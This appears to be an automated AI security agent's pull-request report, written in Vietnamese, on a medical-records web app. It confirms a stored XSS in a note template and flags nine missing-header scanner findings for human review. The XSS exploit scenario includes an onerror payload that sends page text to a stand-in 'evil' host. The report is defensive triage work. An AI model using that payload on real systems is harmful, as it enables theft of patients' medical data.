<!-- secagent-report -->
## 🛡️ AI Security Agent

**Kết quả:** 1 lỗi thật (TP) · 9 cần người xem (NEEDS_REVIEW) · 0 báo nhầm (FP) · trong đó 0 phát hiện mới do Agent tự tìm · commit `b6844e9`

| | Mức | Nguồn | Phát hiện | Vị trí | Độ tin cậy |
|---|---|---|---|---|---|
| 🔴 TP | HIGH | semgrep | security.semgrep.medicare.jinja-safe-filter (semgrep) | `app/medicare/templates/record/detail.html:29` | 0.95 |
| 🟡 NEEDS_REVIEW | MEDIUM | zap | 10020 (zap) | `dast:GET /:0` | 0.40 |
| 🟡 NEEDS_REVIEW | MEDIUM | zap | 10020 (zap) | `dast:GET /login:0` | 0.40 |
| 🟡 NEEDS_REVIEW | MEDIUM | zap | 10038 (zap) | `dast:GET /login:0` | 0.40 |
| 🟡 NEEDS_REVIEW | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments:0` | 0.40 |
| 🟡 NEEDS_REVIEW | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments/{appointment_id}/confirm:0` | 0.40 |
| 🟡 NEEDS_REVIEW | MEDIUM | zap | 10038 (zap) | `dast:POST /patients:0` | 0.40 |
| 🟡 NEEDS_REVIEW | MEDIUM | zap | 10038 (zap) | `dast:POST /patients/{patient_id}/edit:0` | 0.40 |
| 🟡 NEEDS_REVIEW | LOW | zap | 10021 (zap) | `dast:GET /:0` | 0.40 |
| 🟡 NEEDS_REVIEW | LOW | zap | 10021 (zap) | `dast:GET /health:0` | 0.40 |

### Chi tiết

#### 🔴 TP · HIGH · security.semgrep.medicare.jinja-safe-filter (semgrep) — `app/medicare/templates/record/detail.html:29`

CWE-79 · OWASP A05 · độ tin cậy 0.95 · nguồn: semgrep

**Phân tích:** Route add_note nhận `body` từ form và `service.add_note` chỉ strip và kiểm tra độ dài, rồi lưu nguyên HTML. Template render bằng `{{ note.body | safe }}` nên tắt autoescape. Việc làm sạch chỉ nằm ở JS phía client (contenteditable), kẻ tấn công có thể bỏ qua bằng cách POST trực tiếp. Kết quả là stored XSS: script chạy trong phiên của bệnh nhân, y tá, bác sĩ khác xem bệnh án, có thể đánh cắp dữ liệu y tế hoặc thực hiện hành động thay họ. Test cũng chỉ kiểm tra HTML được giữ nguyên, không kiểm tra sanitize.

**Kịch bản khai thác:** Bác sĩ phụ trách (hoặc tài khoản bác sĩ bị chiếm) POST body `<img src=x onerror=fetch('https://evil/?c='+document.body.innerText)>` tới /records/{id}/notes. Khi bệnh nhân hoặc y tá mở phiếu khám, script chạy và lấy dữ liệu bệnh án hoặc gửi request thay người dùng.

**Đề xuất sửa:** Trong app/medicare/record/service.py, hàm add_note: làm sạch body phía server bằng thư viện sanitize HTML với allowlist thẻ (p, b, strong, i, em, u, ul, ol, li, br) và không cho phép thuộc tính hay URL scheme nguy hiểm (ví dụ nh3 hoặc bleach), rồi mới kiểm tra rỗng/độ dài và lưu. Nên sanitize lại khi render (filter an toàn thay cho `| safe` trong detail.html dòng 29). Thêm test XSS (script, onerror, javascript:) cho route POST /records/{id}/notes. Cân nhắc thêm header Content-Security-Policy để giảm thiệt hại.

#### 🟡 NEEDS_REVIEW · MEDIUM · 10020 (zap) — `dast:GET /:0`

CWE-1021 · độ tin cậy 0.40 · nguồn: zap

**Phân tích:** Phát hiện DAST về thiếu header chống clickjacking (X-Frame-Options / frame-ancestors). Không có file nguồn tại vị trí này và phiên này không có công cụ để đọc middleware header, nên không thể xác nhận hay bác bỏ. Cần kiểm tra middleware security headers của ứng dụng hoặc reverse proxy.

#### 🟡 NEEDS_REVIEW · MEDIUM · 10020 (zap) — `dast:GET /login:0`

CWE-1021 · độ tin cậy 0.40 · nguồn: zap

**Phân tích:** Thiếu header chống clickjacking trên GET /login. Cùng nguyên nhân với F2, chưa thể xác minh cấu hình header toàn cục khi không có công cụ đọc mã middleware.

#### 🟡 NEEDS_REVIEW · MEDIUM · 10038 (zap) — `dast:GET /login:0`

CWE-693 · độ tin cậy 0.40 · nguồn: zap

**Phân tích:** Thiếu X-Content-Type-Options trên /login. Đây là cấu hình header toàn cục, PR không thay đổi phần này và không có bằng chứng mã để kết luận.

Gộp các phát hiện: `zap:10021:dast:GET /login:0`, `zap:10038:dast:GET /login:0`

#### 🟡 NEEDS_REVIEW · MEDIUM · 10038 (zap) — `dast:POST /appointments:0`

CWE-693 · độ tin cậy 0.40 · nguồn: zap

**Phân tích:** Thiếu CSP trên POST /appointments. Không có mã tại vị trí này để xác minh; CSP toàn cục nên được rà soát, đặc biệt vì PR này thêm render HTML thô (F1).

#### 🟡 NEEDS_REVIEW · MEDIUM · 10038 (zap) — `dast:POST /appointments/{appointment_id}/confirm:0`

CWE-693 · độ tin cậy 0.40 · nguồn: zap

**Phân tích:** Thiếu CSP trên POST /appointments/{id}/confirm. Cùng nguyên nhân cấu hình header toàn cục, chưa thể xác minh.

#### 🟡 NEEDS_REVIEW · MEDIUM · 10038 (zap) — `dast:POST /patients:0`

CWE-693 · độ tin cậy 0.40 · nguồn: zap

**Phân tích:** Thiếu CSP trên POST /patients. Cấu hình header toàn cục, không thuộc mã thay đổi của PR, chưa đủ bằng chứng.

#### 🟡 NEEDS_REVIEW · MEDIUM · 10038 (zap) — `dast:POST /patients/{patient_id}/edit:0`

CWE-693 · độ tin cậy 0.40 · nguồn: zap

**Phân tích:** Thiếu CSP trên POST /patients/{id}/edit. Cùng nguyên nhân với F7-F9, cần xem middleware header.

#### 🟡 NEEDS_REVIEW · LOW · 10021 (zap) — `dast:GET /:0`

CWE-693 · độ tin cậy 0.40 · nguồn: zap

**Phân tích:** Thiếu X-Content-Type-Options trên GET /. Cấu hình header toàn cục, chưa có bằng chứng mã để xác minh.

#### 🟡 NEEDS_REVIEW · LOW · 10021 (zap) — `dast:GET /health:0`

CWE-693 · độ tin cậy 0.40 · nguồn: zap

**Phân tích:** Thiếu X-Content-Type-Options trên GET /health. Mức độ thấp, endpoint không chứa dữ liệu nhạy cảm; vẫn cần kiểm tra middleware header chung.

---
<sub>LLM `claude-mcp` · model `claude-sonnet-5-5` · chiến lược `single-shot` · 30.1 s · 12 lần gọi LLM · 11 lần gọi công cụ · 62774 token vào / 4285 token ra · ≈ $0.1711 · chạm giới hạn: không</sub>
